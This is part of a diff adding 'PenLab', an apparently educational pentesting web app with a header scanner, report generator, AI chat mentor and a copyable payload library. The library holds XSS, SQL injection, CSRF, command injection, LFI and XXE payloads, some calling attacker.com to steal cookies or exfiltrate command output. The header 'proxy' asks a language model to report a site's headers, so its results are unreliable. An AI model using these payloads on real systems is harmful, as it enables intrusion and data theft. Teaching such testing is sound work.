+              <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:4px">HIGH</div>
+            </div>
+            <div style="text-align:center;padding:12px;background:var(--yellow-dim);border:1px solid rgba(255,208,0,0.2)">
+              <div style="font-family:var(--head);font-size:24px;font-weight:700;color:var(--yellow)" id="rptMedium">0</div>
+              <div style="font-family:var(--mono);font-size:9px;color:var(--text3);margin-top:4px">MEDIUM</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn btn-primary btn-full" onclick="generateReport()" style="margin-top:8px">▤ Generate Report</button>
+    </div>
+  </div>
+
+  <!-- Generated report output -->
+  <div class="panel" id="reportOutput" style="display:none;margin-top:16px">
+    <div class="panel-header">
+      <div class="panel-title">▸ Generated Report</div>
+      <button class="btn btn-ghost btn-sm" onclick="downloadReport()">↓ Download .txt</button>
+    </div>
+    <div class="panel-body">
+      <pre id="reportText" style="font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.8;white-space:pre-wrap;word-break:break-word"></pre>
+    </div>
+  </div>
+</div>
+
+</main>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ══════════════════════════════════════
+// STATE
+// ══════════════════════════════════════
+const state = {
+  scans: 0,
+  findings: [],
+  reportFindings: [],
+  payloadsGenerated: 0,
+};
+
+// ══════════════════════════════════════
+// CLOCK
+// ══════════════════════════════════════
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clockDisplay').textContent =
+    now.toUTCString().split(' ').slice(1,5).join(' ') + ' UTC';
+}
+setInterval(updateClock, 1000); updateClock();
+
+// ══════════════════════════════════════
+// NAV
+// ══════════════════════════════════════
+function showPage(page) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('page-' + page).classList.add('active');
+  document.getElementById('nav-' + page).classList.add('active');
+  if (page === 'payloads') { renderPayloads(); }
+  if (page === 'report') { renderReportFindings(); }
+}
+
+// ══════════════════════════════════════
+// STATS
+// ══════════════════════════════════════
+function incrementStat(id) {
+  const el = document.getElementById(id);
+  el.textContent = parseInt(el.textContent) + 1;
+}
+function updateFindingStat() {
+  document.getElementById('statFindings').textContent = state.findings.length;
+}
+
+// ══════════════════════════════════════
+// ACTIVITY LOG
+// ══════════════════════════════════════
+function logActivity(msg, type='dim') {
+  const log = document.getElementById('activityLog');
+  const time = new Date().toLocaleTimeString();
+  log.innerHTML += `<br><span class="t-${type}">[${time}] ${msg}</span>`;
+  log.scrollTop = log.scrollHeight;
+}
+
+// ══════════════════════════════════════
+// TOAST
+// ══════════════════════════════════════
+let _tt;
+function toast(msg, type='') {
+  const t = document.getElementById('toast');
+  t.textContent = msg; t.className = 'toast show' + (type ? ' ' + type : '');
+  clearTimeout(_tt); _tt = setTimeout(() => t.classList.remove('show'), 2800);
+}
+
+// ══════════════════════════════════════
+// SCANNER
+// ══════════════════════════════════════
+const CHECKS = [
+  {
+    id: 'https',
+    name: 'HTTPS Enforcement',
+    check: (url, hdrs) => !url.startsWith('https://'),
+    severity: 'high',
+    desc: 'The target is not using HTTPS. All traffic is transmitted in plaintext, exposing credentials, session tokens, and sensitive data to interception.',
+    remediation: 'Force HTTPS for all connections. Redirect HTTP to HTTPS. Use HSTS.',
+    cvss: '7.5'
+  },
+  {
+    id: 'hsts',
+    name: 'HTTP Strict Transport Security (HSTS)',
+    check: (url, hdrs) => !hdrs['strict-transport-security'],
+    severity: 'medium',
+    desc: 'The Strict-Transport-Security header is missing. This allows downgrade attacks where an attacker can force the browser to use HTTP.',
+    remediation: 'Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
+    cvss: '5.3'
+  },
+  {
+    id: 'csp',
+    name: 'Content Security Policy (CSP)',
+    check: (url, hdrs) => !hdrs['content-security-policy'],
+    severity: 'medium',
+    desc: 'No Content-Security-Policy header found. CSP is the primary browser defense against XSS attacks. Without it, injected scripts run freely.',
+    remediation: "Add: Content-Security-Policy: default-src 'self'; script-src 'self'",
+    cvss: '6.1'
+  },
+  {
+    id: 'xframe',
+    name: 'Clickjacking Protection (X-Frame-Options)',
+    check: (url, hdrs) => !hdrs['x-frame-options'] && !hdrs['content-security-policy']?.includes('frame-ancestors'),
+    severity: 'medium',
+    desc: 'Missing X-Frame-Options header. The site can be embedded in an iframe, enabling clickjacking attacks where users are tricked into clicking hidden UI elements.',
+    remediation: 'Add: X-Frame-Options: DENY  or use CSP frame-ancestors directive.',
+    cvss: '4.3'
+  },
+  {
+    id: 'xctype',
+    name: 'MIME Sniffing Prevention (X-Content-Type-Options)',
+    check: (url, hdrs) => !hdrs['x-content-type-options'],
+    severity: 'low',
+    desc: 'Missing X-Content-Type-Options: nosniff. Browsers may misinterpret file types, potentially executing uploaded files as scripts.',
+    remediation: 'Add: X-Content-Type-Options: nosniff',
+    cvss: '3.1'
+  },
+  {
+    id: 'xss_protection',
+    name: 'Legacy XSS Filter (X-XSS-Protection)',
+    check: (url, hdrs) => !hdrs['x-xss-protection'],
+    severity: 'low',
+    desc: 'Missing X-XSS-Protection header. While deprecated in modern browsers, it provides protection in older browsers that do not support CSP.',
+    remediation: 'Add: X-XSS-Protection: 1; mode=block',
+    cvss: '3.1'
+  },
+  {
+    id: 'referrer',
+    name: 'Referrer Policy',
+    check: (url, hdrs) => !hdrs['referrer-policy'],
+    severity: 'low',
+    desc: 'No Referrer-Policy header. The full URL may be leaked to third-party sites via the Referer header, exposing sensitive path information.',
+    remediation: 'Add: Referrer-Policy: strict-origin-when-cross-origin',
+    cvss: '3.1'
+  },
+  {
+    id: 'permissions',
+    name: 'Permissions Policy',
+    check: (url, hdrs) => !hdrs['permissions-policy'] && !hdrs['feature-policy'],
+    severity: 'info',
+    desc: 'No Permissions-Policy header. This header controls which browser features (camera, microphone, geolocation) can be used, limiting attack surface.',
+    remediation: 'Add: Permissions-Policy: geolocation=(), microphone=(), camera=()',
+    cvss: '2.0'
+  },
+  {
+    id: 'server',
+    name: 'Server Version Disclosure',
+    check: (url, hdrs) => !!(hdrs['server'] && hdrs['server'].match(/\d+\.\d+/)),
+    severity: 'low',
+    desc: `Server header discloses version information (${state._serverHeader||'unknown'}). Attackers use version info to find known CVEs for that specific version.`,
+    remediation: 'Strip version from Server header or remove header entirely.',
+    cvss: '3.1'
+  },
+  {
+    id: 'cors',
+    name: 'CORS Policy',
+    check: (url, hdrs) => hdrs['access-control-allow-origin'] === '*',
+    severity: 'high',
+    desc: 'Access-Control-Allow-Origin: * allows any origin to make cross-origin requests. This can expose authenticated endpoints to attacker-controlled sites.',
+    remediation: 'Restrict CORS to specific trusted origins. Never use * for credentialed requests.',
+    cvss: '7.1'
+  },
+];
+
+const SEV_ORDER = ['critical','high','medium','low','info'];
+
+// ══════════════════════════════════════
+// CLAUDE PROXY — fetches headers server-side, no CORS
+// ══════════════════════════════════════
+async function fetchHeadersViaProxy(url) {
+  const res = await fetch('https://api.anthropic.com/v1/messages', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      model: 'claude-sonnet-4-20250514',
+      max_tokens: 1000,
+      system: `You are an HTTP header fetcher. When given a URL, use the web_search tool or your knowledge to fetch that URL and return ONLY a valid JSON object of its response headers in lowercase keys. No explanation. No markdown. Just the raw JSON object like: {"content-type":"text/html","server":"nginx","strict-transport-security":"max-age=31536000","x-frame-options":"DENY"} etc. Include every header present. If you cannot fetch it, return {"error":"unreachable"}.`,
+      tools: [{ type: 'web_search_20250305', name: 'web_search' }],
+      messages: [{ role: 'user', content: `Fetch this URL and return its HTTP response headers as a JSON object: ${url}` }]
+    })
+  });
+  const data = await res.json();
+  // Extract the text content block
+  const text = data.content?.filter(b => b.type === 'text').map(b => b.text).join('') || '';
+  // Strip any markdown fences
+  const clean = text.replace(/```json|```/g, '').trim();
+  try { return JSON.parse(clean); } catch { return {}; }
+}
+
+async function runScan() {
+  const url = document.getElementById('scanTarget').value.trim();
+  if (!url) { toast('Enter a target URL first.', 'err'); return; }
+  if (!url.startsWith('http')) { toast('URL must start with http:// or https://', 'err'); return; }
+
+  const btn = document.getElementById('scanBtn');
+  btn.disabled = true; btn.textContent = '⬡ Scanning…';
+  const log = document.getElementById('scanLog');
+  log.innerHTML = '';
+  document.getElementById('findingsContainer').innerHTML = '<div style="text-align:center;padding:32px;color:var(--text3);font-family:var(--mono);font-size:11px">// scanning...</div>';
+
+  const addLog = (msg, cls='t-dim') => {
+    log.innerHTML += `<span class="${cls}">${msg}</span><br>`;
+    log.scrollTop = log.scrollHeight;
+  };
+
+  addLog(`$ initiating scan: ${url}`, 't-green');
+  state.scans++;
+  document.getElementById('statScans').textContent = state.scans;
+  logActivity(`Scan started: ${url}`, 'green');
+
+  let prog = 0;
+  const progEl = document.getElementById('scanProgress');
+  const progTmr = setInterval(() => {
+    prog = Math.min(prog + Math.random() * 6, 85);
+    progEl.style.width = prog + '%';
+  }, 300);
+
+  let headers = {};
+
+  // Step 1: try direct fetch (works if target allows CORS)
+  addLog('$ attempting direct header fetch...', 't-dim');
+  try {
+    const res = await fetch(url, { method: 'HEAD', mode: 'cors', cache: 'no-cache' });
+    res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
+    if (headers['server']) state._serverHeader = headers['server'];
+    addLog(`$ direct fetch OK — HTTP ${res.status} ${res.statusText}`, 't-green');
+    addLog(`$ ${Object.keys(headers).length} headers received directly`, 't-dim');
+  } catch(e) {
+    addLog(`$ direct fetch blocked by CORS — routing via Claude proxy...`, 't-yellow');
+    try {
+      addLog(`$ proxy fetching ${url}...`, 't-dim');
+      const proxyHeaders = await fetchHeadersViaProxy(url);
+      if (proxyHeaders.error) {
+        addLog(`$ proxy could not reach target: ${proxyHeaders.error}`, 't-red');
+        addLog(`$ running URL-only checks...`, 't-dim');
+      } else {
+        headers = proxyHeaders;
+        if (headers['server']) state._serverHeader = headers['server'];
+        addLog(`$ proxy fetch OK — ${Object.keys(headers).length} headers retrieved`, 't-green');
+        Object.entries(headers).forEach(([k,v]) => {
+          addLog(`$   ${k}: ${v.substring(0,80)}${v.length>80?'…':''}`, 't-dim');
+        });
+      }
+    } catch(pe) {
+      addLog(`$ proxy error: ${pe.message}`, 't-red');
+      addLog(`$ running URL-only checks...`, 't-dim');
+    }
+  }
+
+  await delay(200);
+  addLog('$ running security header checks...', 't-dim');
+  await delay(300);
+
+  const found = [];
+  for (const check of CHECKS) {
+    await delay(60);
+    const failed = check.check(url, headers);
+    if (failed) {
+      found.push(check);
+      const color = {critical:'t-red',high:'t-red',medium:'t-yellow',low:'t-blue',info:'t-dim'}[check.severity];
+      addLog(`$ [${check.severity.toUpperCase()}] ${check.name}`, color);
+    } else {
+      addLog(`$ [OK] ${check.name}`, 't-green');
+    }
+  }
+
+  found.forEach(f => {
+    if (!state.findings.find(x => x.id === f.id)) state.findings.push({...f, url});
+  });
+
+  clearInterval(progTmr);
+  progEl.style.width = '100%';
+  setTimeout(() => { progEl.style.width = '0%'; }, 1500);
+
+  addLog(`$ scan complete — ${found.length} issue${found.length!==1?'s':''} found`, found.length > 0 ? 't-yellow' : 't-green');
+  updateFindingStat();
+  renderFindings(found, url);
+  document.getElementById('findingCount').textContent = `${found.length} issue${found.length!==1?'s':''}`;
+  logActivity(`Scan complete: ${found.length} findings`, found.length > 0 ? 'yellow' : 'green');
+
+  btn.disabled = false; btn.textContent = '⬡ Start Scan';
+}
+
+function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function renderFindings(findings, url) {
+  const container = document.getElementById('findingsContainer');
+  if (!findings.length) {
+    container.innerHTML = '<div style="text-align:center;padding:32px;color:var(--green);font-family:var(--mono);font-size:12px">✓ No issues detected</div>';
+    return;
+  }
+  const sorted = [...findings].sort((a,b) => SEV_ORDER.indexOf(a.severity) - SEV_ORDER.indexOf(b.severity));
+  container.innerHTML = sorted.map(f => `
+    <div class="finding" id="f_${f.id}">
+      <div class="finding-header" onclick="toggleFinding('${f.id}')">
+        <span class="badge badge-${f.severity}">${f.severity}</span>
+        <span class="finding-title">${f.name}</span>
+        <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();addToReport('${f.id}','${f.name}','${f.severity}')">+ Report</button>
+      </div>
+      <div class="finding-body">
+        <div class="finding-desc">${f.desc}</div>
+        <div class="finding-detail">
+          <strong>CVSS Score</strong>${f.cvss} / 10
+          <strong>Remediation</strong>${f.remediation}
+          <strong>Target</strong>${url}
+        </div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function toggleFinding(id) {
+  document.getElementById('f_'+id).classList.toggle('open');
+}
+
+// ══════════════════════════════════════
+// PAYLOADS
+// ══════════════════════════════════════
+const VULN_DESCS = {
+  xss: { name:'Cross-Site Scripting (XSS)', desc:'XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script in the victim\'s session, enabling cookie theft, keylogging, or full account takeover. It is the #3 vulnerability in the OWASP Top 10.' },
+  sqli: { name:'SQL Injection', desc:'SQL injection tricks a database into executing attacker-controlled commands. By inserting SQL syntax into input fields, attackers can dump entire databases, bypass authentication, or in some cases execute OS commands. Ranked #3 in OWASP Top 10.' },
+  csrf: { name:'Cross-Site Request Forgery', desc:'CSRF tricks an authenticated user\'s browser into sending unintended requests to a target site. The attacker crafts a page that silently submits a form or makes a fetch request — the server receives it with the victim\'s valid cookies.' },
+  cmdi: { name:'Command Injection', desc:'When user input is passed unsanitised to a system shell, attackers can append OS commands. This can lead to full server compromise, reverse shells, data exfiltration, or ransomware deployment.' },
+  lfi: { name:'Local File Inclusion', desc:'LFI occurs when a web app includes local files based on user input without validation. Attackers can read sensitive files like /etc/passwd, application configs with credentials, or chain with log poisoning for code execution.' },
+  xxe: { name:'XML External Entity (XXE)', desc:'When an XML parser processes external entity references in untrusted XML input, attackers can read local files, perform SSRF, or in some parsers achieve remote code execution. Affects any endpoint that processes XML.' },
+};
+
+const PAYLOADS = {
+  xss: [
+    { name:'Basic Alert', ctx:'basic', code:`<script>alert('XSS')</script>`, explain:'The most fundamental XSS test. If an alert box appears, the application is rendering your input as HTML without sanitisation.' },
+    { name:'Image onerror', ctx:'basic', code:`<img src=x onerror=alert('XSS')>`, explain:'Triggers when the image src fails to load. Useful when script tags are filtered but HTML attributes are not.' },
+    { name:'SVG onload', ctx:'filter', code:`<svg onload=alert('XSS')>`, explain:'SVG elements support JavaScript events. Often bypasses filters that only look for <script> tags.' },
+    { name:'JavaScript URI', ctx:'filter', code:`javascript:alert('XSS')`, explain:'Used in href or src attributes. Executes when the link is clicked. Bypasses some tag-based filters.' },
+    { name:'Double Encoding', ctx:'filter', code:`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E`, explain:'URL-encodes the payload twice. The server decodes once, the browser decodes again. Bypasses single-decode filters.' },
+    { name:'Cookie Stealer', ctx:'blind', code:`<script>fetch('https://attacker.com/?c='+document.cookie)</script>`, explain:'Exfiltrates session cookies to an attacker-controlled server. Only works if CSP does not block external requests.' },
+    { name:'DOM Sink', ctx:'blind', code:`#<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`, explain:'Base64-encodes the payload to evade WAF keyword filters. eval(atob()) decodes and executes at runtime.' },
+  ],
+  sqli: [
+    { name:`Basic OR Bypass`, ctx:'basic', code:`' OR '1'='1`, explain:'Classic authentication bypass. If the query is SELECT * FROM users WHERE password=\'INPUT\', this always returns true.' },
+    { name:`Comment Bypass`, ctx:'basic', code:`admin'--`, explain:'The -- comments out the rest of the SQL query. Combined with a known username, this bypasses password checks.' },
+    { name:`UNION Select`, ctx:'basic', code:`' UNION SELECT null,username,password FROM users--`, explain:'UNION allows appending a second query. Used to extract data from other tables. Column count must match.' },
+    { name:`Error-Based`, ctx:'filter', code:`' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--`, explain:'Forces a SQL type conversion error that reveals data in the error message. Useful for data extraction without UNION.' },
+    { name:`Time-Based Blind`, ctx:'blind', code:`'; IF (1=1) WAITFOR DELAY '0:0:5'--`, explain:'If the response is delayed 5 seconds, the condition is true. Used to extract data one bit at a time when no output is visible.' },
+    { name:`Boolean Blind`, ctx:'blind', code:`' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--`, explain:'Returns true/false based on a condition. By iterating over characters, the full value can be extracted.' },
+  ],
+  csrf: [
+    { name:'HTML Form', ctx:'basic', code:`<form action="https://target.com/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker">\n  <input type="hidden" name="amount" value="1000">\n</form>\n<script>document.forms[0].submit()</script>`, explain:'Auto-submits a form when the victim visits the attacker page. Sends the request with the victim\'s cookies attached by the browser.' },
+    { name:'Image GET', ctx:'basic', code:`<img src="https://target.com/logout">`, explain:'A GET request masquerading as an image load. If the target endpoint triggers actions via GET, this executes silently.' },
+    { name:'Fetch CSRF', ctx:'filter', code:`fetch('https://target.com/api/action',{method:'POST',credentials:'include',body:'data=evil'})`, explain:'Modern fetch-based CSRF. credentials:include sends cookies. Only works if CORS policy is misconfigured.' },
+    { name:'Token Bypass (Referer)', ctx:'filter', code:`<meta name="referrer" content="no-referrer">`, explain:'Strips the Referer header from the request. If the server validates Referer instead of a CSRF token, this bypasses it.' },
+  ],
+  cmdi: [
+    { name:'Basic Injection', ctx:'basic', code:`; ls -la`, explain:'Appends a second command after a semicolon. If the input is passed to a shell, both commands execute.' },
+    { name:'Pipe Injection', ctx:'basic', code:`| whoami`, explain:'Pipes output of the injected command. The application shows whoami output if vulnerable.' },
+    { name:'Backtick Execution', ctx:'filter', code:'`id`', explain:'Backticks execute a subshell in bash. The result is substituted into the command.' },
+    { name:'Blind OOB', ctx:'blind', code:`; curl https://attacker.com/$(whoami)`, explain:'Exfiltrates command output out-of-band via a DNS/HTTP callback. Used when output is not returned in response.' },
+    { name:'Windows Injection', ctx:'basic', code:`& whoami`, explain:'Windows command separator. Works on IIS or Windows-based servers.' },
+  ],
+  lfi: [
+    { name:'Basic Path Traversal', ctx:'basic', code:`../../../etc/passwd`, explain:'Traverses up the directory tree to reach /etc/passwd. Classic LFI test on Linux servers.' },
+    { name:'Null Byte', ctx:'filter', code:`../../../etc/passwd%00`, explain:'Null byte truncates the string in C-based languages. Bypasses extensions appended by the application (e.g. file.php).' },
+    { name:'Double Encoding', ctx:'filter', code:`..%252F..%252F..%252Fetc%252Fpasswd`, explain:'Double URL encodes the slash. Bypasses single-decode path filters.' },
+    { name:'Windows Path', ctx:'basic', code:`..\\..\\..\\windows\\win.ini`, explain:'Windows equivalent. Reads win.ini as a proof-of-concept file.' },
+    { name:'Log Poisoning', ctx:'blind', code:`/var/log/apache2/access.log`, explain:'If you can control a header that gets logged (e.g. User-Agent), poisoning the log with PHP then including it gives RCE.' },
+  ],
+  xxe: [
+    { name:'Basic XXE', ctx:'basic', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>`, explain:'Defines an external entity pointing to /etc/passwd. If the parser resolves it, the file contents are included in the response.' },
+    { name:'SSRF via XXE', ctx:'filter', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>`, explain:'Points the entity at the AWS metadata endpoint. Leaks IAM credentials and instance data in cloud environments.' },
+    { name:'Blind OOB XXE', ctx:'blind', code:`<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>\n<root>test</root>`, explain:'Loads a remote DTD that contains parameter entities to exfiltrate data out-of-band, when errors are suppressed.' },
+  ],
+};
+
+function renderPayloads() {
+  const cat = document.getElementById('payloadCategory').value;
+  const ctx = document.getElementById('payloadContext').value;
+  const payloads = PAYLOADS[cat]?.filter(p => ctx === 'all' || p.ctx === ctx) || [];
+
+  const v = VULN_DESCS[cat];
+  document.getElementById('vulnDesc').innerHTML = `<strong style="color:var(--text);font-family:var(--head);font-size:14px;letter-spacing:1px">${v.name}</strong><br><br>${v.desc}`;
+
+  const list = document.getElementById('payloadList');
+  if (!payloads.length) {
+    list.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text3);font-family:var(--mono);font-size:11px">// no payloads for this context filter</div>';
+    return;
+  }
+
+  list.innerHTML = payloads.map((p, i) => `
+    <div class="payload-card" id="pl_${i}">
+      <div class="payload-header" onclick="document.getElementById('pl_${i}').classList.toggle('open')">
+        <span class="badge badge-${p.ctx==='basic'?'ok':p.ctx==='filter'?'medium':'high'}" style="font-size:9px">${p.ctx}</span>
+        <span class="payload-title">${p.name}</span>
+        <button class="btn btn-ghost btn-sm" onclick="event.stopPropagation();addToReport(null,'${p.name} (${cat.toUpperCase()})','medium')">+ Report</button>
+      </div>
+      <div class="payload-body">
+        <div class="payload-code">${escHtml(p.code)}<button class="payload-copy" onclick="copyPayload(this,'${encodeURIComponent(p.code)}')">COPY</button></div>
+        <div class="payload-explain">${p.explain}</div>
+        <div class="payload-warn">⚠ Only use against systems you own or have written permission to test.</div>
+      </div>
+    </div>
+  `).join('');
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function copyPayload(btn, encoded) {
+  navigator.clipboard.writeText(decodeURIComponent(encoded)).then(() => {
+    btn.textContent = 'COPIED!';
+    setTimeout(() => btn.textContent = 'COPY', 1500);
+    toast('Payload copied to clipboard.');
+    state.payloadsGenerated++;
+  });
+}
+
+function addAllToReport() {
+  const cat = document.getElementById('payloadCategory').value;
+  const payloads = PAYLOADS[cat] || [];
+  payloads.forEach(p => addToReport(null, `${p.name} (${cat.toUpperCase()})`, 'medium'));
+  toast(`${payloads.length} payloads added to report.`);
+}
+
+// ══════════════════════════════════════
+// REPORT
+// ══════════════════════════════════════
+function addToReport(id, name, severity) {
+  if (!state.reportFindings.find(f => f.name === name)) {
+    state.reportFindings.push({id, name, severity, notes:''});
+    updateRiskCounts();
+    toast(`"${name}" added to report.`);
+  } else {
+    toast('Already in report.', 'err');
+  }
+}
+
+function addManualFinding() {
+  const name = prompt('Finding name:');
+  if (!name) return;
+  const sev = prompt('Severity (critical/high/medium/low/info):') || 'medium';
+  addToReport(null, name, sev);
+  renderReportFindings();
+}
+
+function renderReportFindings() {
+  const container = document.getElementById('reportFindings');
+  if (!state.reportFindings.length) {
+    container.innerHTML = '<div style="text-align:center;padding:24px;color:var(--text3);font-family:var(--mono);font-size:11px">// no findings yet</div>';
+    return;
+  }
+  container.innerHTML = state.reportFindings.map((f, i) => `
+    <div class="finding-item">
+      <span class="badge badge-${f.severity}">${f.severity}</span>
+      <span class="finding-item-title">${f.name}</span>
+      <div class="finding-item-actions">
+        <button class="btn btn-danger btn-sm" onclick="removeFinding(${i})">✕</button>
+      </div>
+    </div>
+  `).join('');
+  updateRiskCounts();
+}
+
+function removeFinding(i) {
+  state.reportFindings.splice(i, 1);
+  renderReportFindings();
+}
+
+function updateRiskCounts() {
+  ['critical','high','medium'].forEach(s => {
+    document.getElementById('rpt'+s.charAt(0).toUpperCase()+s.slice(1)).textContent =
+      state.reportFindings.filter(f => f.severity === s).length;
+  });
+}
+
+function generateReport() {
+  const tester = document.getElementById('rptTester').value || 'Unknown';
+  const target = document.getElementById('rptTarget').value || 'Unknown';
+  const scope = document.getElementById('rptScope').value || 'Unknown';
+  const date = document.getElementById('rptDate').value || new Date().toISOString().split('T')[0];
+  const summary = document.getElementById('rptSummary').value || 'No summary provided.';
+
+  const severityCounts = {};
+  SEV_ORDER.forEach(s => severityCounts[s] = state.reportFindings.filter(f => f.severity===s).length);
+
+  const divider = '═'.repeat(64);
+  const line = '─'.repeat(64);
+
+  let report = `
+${divider}
+  PENETRATION TEST REPORT
+  Generated by PenLab v1.0
+${divider}
+
+ENGAGEMENT DETAILS
+${line}
+Tester        : ${tester}
+Target        : ${target}
+Scope         : ${scope}
+Date          : ${date}
+Tool          : PenLab v1.0 (Educational)
+
+EXECUTIVE SUMMARY
+${line}
+${summary}
+
+RISK SUMMARY
+${line}
+Critical  : ${severityCounts.critical}
+High      : ${severityCounts.high}
+Medium    : ${severityCounts.medium}
+Low       : ${severityCounts.low}
+Info      : ${severityCounts.info}
+Total     : ${state.reportFindings.length}
+
+FINDINGS
+${line}
+`;
+
+  if (!state.reportFindings.length) {
+    report += 'No findings recorded.\n';
+  } else {
+    state.reportFindings.forEach((f, i) => {
+      const fdata = CHECKS.find(c => c.id === f.id) || {};
+      report += `
+[${i+1}] ${f.name}
+Severity    : ${f.severity.toUpperCase()}
+${fdata.cvss ? `CVSS Score  : ${fdata.cvss} / 10\n` : ''}${fdata.desc ? `Description : ${fdata.desc}\n` : ''}${fdata.remediation ? `Remediation : ${fdata.remediation}\n` : ''}${line}
+`;
+    });
+  }
+
+  report += `
+DISCLAIMER
+${line}
+This report was generated using PenLab for educational purposes.
+All testing was performed on authorized systems only.
+This report does not constitute professional security advice.
+`;
+
+  document.getElementById('reportText').textContent = report;
+  document.getElementById('reportOutput').style.display = 'block';
+  document.getElementById('reportOutput').scrollIntoView({behavior:'smooth'});
+  toast('Report generated!');
+}
+
+function downloadReport() {
+  const text = document.getElementById('reportText').textContent;
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([text], {type:'text/plain'}));
+  a.download = `penlab-report-${Date.now()}.txt`;
+  a.click();
+  toast('Report downloaded.');
+}
+
+// ══════════════════════════════════════
+// LEARN — CLAUDE API
+// ══════════════════════════════════════
+const chatHistory = [];
+
+function askTopic(question) {
+  showPage('learn');
+  document.getElementById('chatInput').value = question;
+  sendChat();
+}
+
+async function sendChat() {
+  const input = document.getElementById('chatInput');
+  const msg = input.value.trim();
+  if (!msg) return;
+  input.value = '';
+
+  addChatMsg(msg, 'user');
+  chatHistory.push({role:'user', content: msg});
+
+  const btn = document.getElementById('chatSendBtn');
+  btn.disabled = true; btn.textContent = '…';
+
+  // Typing indicator
+  const typingId = 'typing_' + Date.now();
+  const chatWin = document.getElementById('chatWindow');
+  chatWin.innerHTML += `
+    <div class="chat-msg ai" id="${typingId}">
+      <div class="chat-avatar">AI</div>
+      <div class="chat-typing">
+        <div class="typing-dot"></div>
+        <div class="typing-dot"></div>
+        <div class="typing-dot"></div>
+      </div>
+    </div>`;
+  chatWin.scrollTop = chatWin.scrollHeight;
+
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        model: 'claude-sonnet-4-20250514',
+        max_tokens: 1000,
+        system: `You are an expert penetration tester and cybersecurity mentor inside PenLab, an educational pentesting platform for beginners. 
+
+Your role:
+- Explain security concepts clearly with real examples
+- Walk through how attacks work step by step
+- Explain both the attack AND the defense/remediation
+- Use code examples and payloads where helpful
+- Keep responses focused and practical
+- Always emphasize ethical and legal use — only test systems you own or have permission to test
+- Format with **bold** for key terms and \`code\` for technical values
+- Be encouraging — this is for learners
+
+Never help with: targeting specific real systems without permission, creating malware, doxing, or any illegal activity.`,
+        messages: chatHistory
+      })
+    });
+
+    const data = await res.json();
+    document.getElementById(typingId)?.remove();
+
+    const reply = data.content?.[0]?.text || 'Sorry, I could not get a response.';
+    chatHistory.push({role:'assistant', content: reply});
+    addChatMsg(reply, 'ai');
+
+  } catch(e) {
+    document.getElementById(typingId)?.remove();
+    addChatMsg('Connection error. Make sure you\'re on a network that can reach the API.', 'ai');
+  }
+
+  btn.disabled = false; btn.textContent = '▶ Ask';
+}
+
+function addChatMsg(text, role) {
+  const chatWin = document.getElementById('chatWindow');
+  // Convert markdown-lite to html
+  const html = text
+    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
+    .replace(/`(.*?)`/g, '<code>$1</code>')
+    .replace(/\n/g, '<br>');
+  chatWin.innerHTML += `
+    <div class="chat-msg ${role}">
+      <div class="chat-avatar">${role === 'user' ? 'YOU' : 'AI'}</div>
+      <div class="chat-bubble">${html}</div>
+    </div>`;
+  chatWin.scrollTop = chatWin.scrollHeight;
+}
+
+// ══════════════════════════════════════
+// INIT
+// ══════════════════════════════════════
+document.getElementById('rptDate').value = new Date().toISOString().split('T')[0];
+renderPayloads();
+</script>
+</body>
+</html>
